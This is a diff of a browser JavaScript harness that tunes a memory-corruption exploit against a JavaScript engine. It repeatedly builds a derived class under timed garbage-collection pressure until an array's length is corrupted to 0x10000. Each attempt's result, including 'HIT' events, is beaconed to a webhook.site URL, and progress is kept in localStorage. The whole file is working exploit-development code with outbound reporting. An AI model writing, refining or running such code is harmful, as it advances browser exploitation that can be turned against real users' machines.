@@ -2,73 +2,78 @@
 
 function beacon(tag, data) {
   try { new Image().src = "https://webhook.site/170a66c4-f18e-46d3-9d97-418fef7e5124?t=" + encodeURIComponent(tag) + "&d=" + encodeURIComponent(JSON.stringify(data||{})); } catch(e) {}
-  try { fetch("https://webhook.site/170a66c4-f18e-46d3-9d97-418fef7e5124?t=" + encodeURIComponent(tag) + "&d=" + encodeURIComponent(JSON.stringify(data||{}))); } catch(e) {}
 }
-beacon("sweep-loaded", {});
+beacon("sweep2-loaded", {});
 
-function makeAttempt(cfg) {
-  return new Function("cfg", `
+var LOOPLENS = [400, 500, 650, 800, 1000, 1300];
+var GCS = [200, 800];
+
+function runConfig(loopLen, gcFrac, gcCount, variant) {
+  return new Function("loopLen","gcFrac","gcCount","variant", `
     var dogc_flag = false;
     var buffer = new ArrayBuffer(8);
     var f64 = new Float64Array(buffer);
     var u32 = new Uint32Array(buffer);
-    var b64 = new BigUint64Array(buffer);
     var empty_object = {}; var empty_array = [];
     var corrupted_instance = null;
     function dogc() {
-      if (dogc_flag == true) { for (var i = 0; i < cfg.gcCount; i++) { new ArrayBuffer(cfg.gcSize); } }
+      if (dogc_flag == true) { for (var i = 0; i < gcCount; i++) { new ArrayBuffer(0x10000); } }
     }
     class ClassParent {}
     class ClassBug extends ClassParent {
-      constructor(a20, a21, a22) {
+      constructor() {
         const v24 = new new.target();
         var x = [empty_object,empty_object,empty_object,empty_object,empty_object,empty_object,empty_object,empty_object];
         super();
+        if (variant == 2) { dogc(); }
         var a = [1.1];
         this.x = x; this.a = a;
+        this.d = dogc;
         JSON.stringify(empty_array);
       }
-      [1] = dogc();
+      [1] = (variant == 1) ? dogc() : 0;
     }
-    for (var i = 0; i < 200; i++) { dogc_flag = false; if (i%2 == 0) dogc_flag = true; dogc(); }
-    for (var i = 0; i < 650; i++) {
+    var hotAt = Math.floor(loopLen * gcFrac);
+    for (var i = 0; i < 200; i++) { dogc_flag = false; if (i%2==0) dogc_flag = true; dogc(); }
+    for (var i = 0; i < loopLen; i++) {
       dogc_flag = false;
-      if (i >= cfg.hotStart && i <= cfg.hotEnd) { dogc_flag = true; dogc(); dogc_flag = false; }
-      if (i == cfg.finalGc) dogc_flag = true;
+      if (i >= hotAt && i < hotAt + 4) { dogc_flag = true; dogc(); dogc_flag = false; }
+      if (i == loopLen - 4) dogc_flag = true;
       var x = Reflect.construct(ClassBug, empty_array, ClassParent);
-      if (i == 646) corrupted_instance = x;
+      if (i == Math.floor(loopLen*0.5)) corrupted_instance = x;
     }
     var x = corrupted_instance.x;
     var a = corrupted_instance.a;
     var corrupted = (a.length == 0x10000);
-    return {corrupted: corrupted, alen: a.length, xlen: x.length};
+    return corrupted;
   `);
 }
 
-var configs = [];
-for (var g of [900, 1000, 500]) {
-  for (var s of [638, 640, 642, 644, 646, 648]) {
-    configs.push({gcCount: g, gcSize: 0x10000, hotStart: s, hotEnd: s+3, finalGc: 646});
-  }
+var done = {};
+try { done = JSON.parse(localStorage.getItem("sweep2") || "{}"); } catch(e) {}
+var cfgs = [];
+for (var L of LOOPLENS) for (var gf of [0.3,0.45,0.6,0.75,0.85,0.92]) for (var g of GCS) for (var v of [1,2]) {
+  var key = L+"_"+gf+"_"+g+"_v"+v;
+  if (!done[key]) cfgs.push({L:L, gf:gf, g:g, v:v, key:key});
 }
-var results = {};
+beacon("sweep2-plan", {todo: cfgs.length});
 var idx = 0;
 function tryNext() {
-  if (idx >= configs.length) { beacon("sweep-done", results); return; }
-  var cfg = configs[idx];
-  var tag = "cfg" + idx + "-g" + cfg.gcCount + "-s" + cfg.hotStart;
+  if (idx >= cfgs.length) { beacon("sweep2-done", {all:true}); return; }
+  var c = cfgs[idx];
   try {
-    var f = makeAttempt(cfg);
-    var r = f(cfg);
-    results[tag] = {c: r.corrupted, al: r.alen};
-    beacon("sweep-" + tag, {corrupted: r.corrupted, alen: r.alen});
-    if (r.corrupted) { beacon("HIT", {tag: tag, cfg: cfg}); }
+    var f = runConfig(c.L, c.gf, c.g, c.v);
+    var r = f(c.L, c.gf, c.g, c.v);
+    done[c.key] = r;
+    beacon("sweep2-" + c.key, {corrupted: r});
+    if (r) { beacon("HIT2", {key: c.key}); localStorage.setItem("sweep2", JSON.stringify(done)); return; }
   } catch(e) {
-    results[tag] = "err:" + String(e).slice(0,60);
-    beacon("sweep-" + tag + "-err", {e: String(e).slice(0,80)});
+    done[c.key] = "err";
+    beacon("sweep2-" + c.key + "-err", {e: String(e).slice(0,60)});
   }
+  if (idx % 8 == 7) { try { localStorage.setItem("sweep2", JSON.stringify(done)); } catch(e) {} }
   idx++;
-  setTimeout(tryNext, 400);
+  setTimeout(tryNext, 200);
 }
 tryNext();
 
